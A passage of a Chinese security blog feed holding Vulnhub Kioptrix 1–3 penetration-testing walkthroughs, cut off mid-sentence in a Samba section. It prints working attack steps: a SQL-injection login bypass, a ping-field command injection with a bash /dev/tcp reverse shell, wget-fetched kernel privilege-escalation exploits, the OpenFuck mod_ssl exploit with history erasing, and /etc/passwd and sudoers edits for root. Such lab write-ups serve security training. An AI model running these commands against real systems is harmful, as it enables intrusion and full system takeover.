class="line">CEO</span><br></pre></td></tr></table></figure><p>英语比较垃圾，百度翻译的意思是可以通过<code>sudo ht</code>对文件进行编辑，创建。</p><p>在kali下尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure><p>报错不能打开一个<code>xterm-256color.</code>终端。</p><p>回到本地环境用<code>xshell</code>连接是可以打开的</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_13.png" alt=""></p><p>此时按<code>F3</code>，可以输入<code>/etc/passwd</code>或者<code>/etc/sudoers</code>文件来进行文件编辑</p><p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_14.png" alt=""></p><p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_15.png" alt=""></p><p>重新登录SSH。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Last login: Tue May  8 19:27:01 2018 from uknow-pc</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),100(users)</span><br><span class="line">root@Kioptrix3:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>此时已经是<code>root</code>权限了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验过程挺长的，发现了很多地方的问题，第一是发现了<code>phpmyadmin</code>我尝试用写日志的方法试试能不能拿到shell。但是发现<code>phpmyadmin</code>变量了不存在<code>general log</code>变量。</p><p>另外就是这里有个SQL注入，可以用<code>sqlmap</code>跑出来，是<code>root</code>权限。尝试用<code>os-shell</code>写shell。通过了之前用远程命令执行得到的绝对路径，但是还是无法写入。好像是目录权限的问题。</p><p>在<code>phpmyadmin</code>下也无法执行<code>INTO OUTFILE</code>函数。显示<code>#1 - Can&#39;t create/write to file</code>。从在命令执行里也看得出来目录是没有权限的。</p><p>在最后补充了一个文件包含和后台上传的利用，这个组合通过文件包含执行图片木马，得到一个shell。虽然说很鸡肋，还是感觉有点厉害的。</p><p>在实验过程中还是想多多尝试多种方法的，但是实验环境还是有限。但在这次实验中还是学到了很多，做了几次<code>vulnhub</code>的实验了，感觉提权方面还是有学习到很多。</p><p>虽然说这些环境有点不常见甚至奇葩，但是还是在这个过程中学到了<code>linux</code>环境下的一些之前一直匮乏的知识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;同样用&lt;code&gt;netdiscover&lt;/code&gt;发现目标主机。&lt;/p&gt;
&lt;figure class=&quot;highligh
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 2</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-2.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-2.html</id>
    <published>2018-05-07T08:53:11.000Z</published>
    <updated>2018-05-07T10:21:57.542Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>同样是<code>netdiscover</code>收集信息，发现目标IP地址。</p><p>目标的IP地址为<code>192.168.43.47</code></p><p>nmap扫描端口信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A -T4 192.168.43.47</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-07 05:01 EDT</span><br><span class="line">Nmap scan report for 192.168.43.47</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1            841/udp  status</span><br><span class="line">|_  100024  1            844/tcp  status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2018-05-07T05:51:42+00:00; -3h09m44s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h09m44s, deviation: 0s, median: -3h09m44s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.43.47</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存在<code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</code>端口</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_1.png" alt=""></p><p>尝试万能密码<code>&#39; or 1=1#</code> ，成功登录。</p><p>可以看到一个执行ping命令的框框。</p><p>可见是一个命令执行漏洞。</p><p>在命令执行中是有<code>| &amp;&amp; || ;</code>这些常见的符号的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whoai||id//如果||左边的命令（命令1）未执行成功，那么就执行||右边的命令（命令2）；</span><br><span class="line">bash: whoai: 未找到命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami|id//执行后一个命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami;id//按顺序执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami&amp;&amp;id//&amp;&amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，&amp;&amp;右边的命令（命令2）才能够被执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure><p>这里我们可以利用<code>| ;</code>进行命令执行</p><p>测试<code>cat /etc/passwd</code></p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_2.png" alt=""></p><p>下面用命令执行一个交互shell.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -i &gt;&amp; /dev/tcp/192.168.43.177/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>同时用<code>nc</code>监听2333端口。</p><p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3.png" alt=""></p><p>得到一个交互shell。但是权限是<code>apache</code>用户。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>当前的权限是<code>apache</code>用户,我们需要对他进行提权得到<code>root</code>权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure><p>查看当前系统版本。<code>searchsploit linux 2.6.9</code>查找相关提权漏洞</p><p><code>https://www.exploit-db.com/download/9542.c</code></p><p>利用到9542.c的exp.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd /tmp</span><br><span class="line">bash-3.00$ wget http://192.168.43.177/9542.c</span><br><span class="line">--03:06:55--  http://192.168.43.177/9542.c</span><br><span class="line">           =&gt; `9542.c&apos;</span><br><span class="line">Connecting to 192.168.43.177:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,645 (2.6K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ..                                                    100%  252.25 MB/s</span><br><span class="line"></span><br><span class="line">03:06:55 (252.25 MB/s) - `9542.c&apos; saved [2645/2645]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 9542 9542.c</span><br><span class="line">bash-3.00$ ./9542</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>提权成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;同样是&lt;code&gt;netdiscover&lt;/code&gt;收集信息，发现目标IP地址。&lt;/p&gt;
&lt;p&gt;目标的IP地址为&lt;code
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 1</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-1.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-1.html</id>
    <published>2018-05-07T07:28:05.000Z</published>
    <updated>2018-05-07T08:51:51.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>通过<code>netdiscover</code>发现目标主机IP地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.63.0/16   |   Screen View: Unique Hosts         </span><br><span class="line">                                                                             </span><br><span class="line"> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180             </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      1      60  Xiaomi Communications Co L</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      1      60  Intel Corporate           </span><br><span class="line"> 192.168.43.54   00:0c:29:7c:3a:16      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure><p>从扫描信息的得的目标主机的IP地址为<code>192.168.43.54</code></p><p>nmap 扫描IP的端口信息<code>nmap -A 192.168.43.54</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS 192.168.43.54</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.10 ( https://nmap.org ) at 2018-05-07 15:48 </span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.43.54</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1           1024/tcp  status</span><br><span class="line">|_  100024  1           1024/udp  status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_ssl-date: 2018-05-07T07:50:42+00:00; +1m50s from scanner time.</span><br><span class="line">| sslv2:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers:</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7C:3A:16 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.55 ms 192.168.43.54</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds</span><br></pre></td></tr></table></figure><p><code>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</code></p><p>443端口的服务<code>mod_ssl/2.8.4 OpenSSL/0.9.6b</code></p><p>通过<code>searchsploit mod_ssl</code>查询相关漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit mod_ssl</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                         |  Path</span><br><span class="line">                                       | (/usr/share/exploitdb/)</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Apache mod_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt</span><br><span class="line">Apache mod_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/764.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0. | exploits/unix/remote/40347.txt</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>这里可以利用第4个漏洞的exp脚本进行攻击，<code>exploit-db</code>下载相关exp。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="OpenFuck漏洞利用"><a href="#OpenFuck漏洞利用" class="headerlink" title="OpenFuck漏洞利用"></a>OpenFuck漏洞利用</h3><p>这是一个远程溢出的漏洞，下载的exp比较久远需要做一些修改。</p><ul><li>编译需要用的<code>libssl-dev</code>库，且版本为<code>apt-get install libssl1.0-dev</code></li><li>在exp中加入头文件<code>&lt;openssl/rc4.h&gt;</code>和<code>&lt;openssl/md5.h&gt;</code></li><li>替换exp中的<code>wget</code>后的url为<code>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</code></li><li>第961行,修改为<code>const unsigned char * p，* end;</code></li></ul><p>然后编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o OpenFuck 764.c -lcrypto</span><br></pre></td></tr></table></figure></p><p>运行脚本<code>./OpenFuck</code>选择相应我系统版本</p><p>这里选择 0x6b</p><p>执行相关的命令<code>./OpenFuck 0x6b 192.168.43.54</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">--04:04:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--04:04:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ...                                                   100% @   3.74 MB/s</span><br><span class="line"></span><br><span class="line">04:04:39 (3.74 MB/s) - `ptrace-kmod.c&apos; saved [3921/3921]</span><br><span class="line"></span><br><span class="line">[+] Attached to 6498</span><br><span class="line">[+] Waiting for signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h3 id="Samba漏洞利用"><a href="#Samba漏洞利用" class="headerlink" title="Samba漏洞利用"></a>Samba漏洞利用</h3><p>实验环境是存在一个samba漏洞的，</p><p>这里用到<code>enum4linux</code>其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。</p><p>但我本地环境没有检测到samba的版本</p><p>该漏洞为<code>Samba trans2open溢出（Linux x86）</code>在Samba 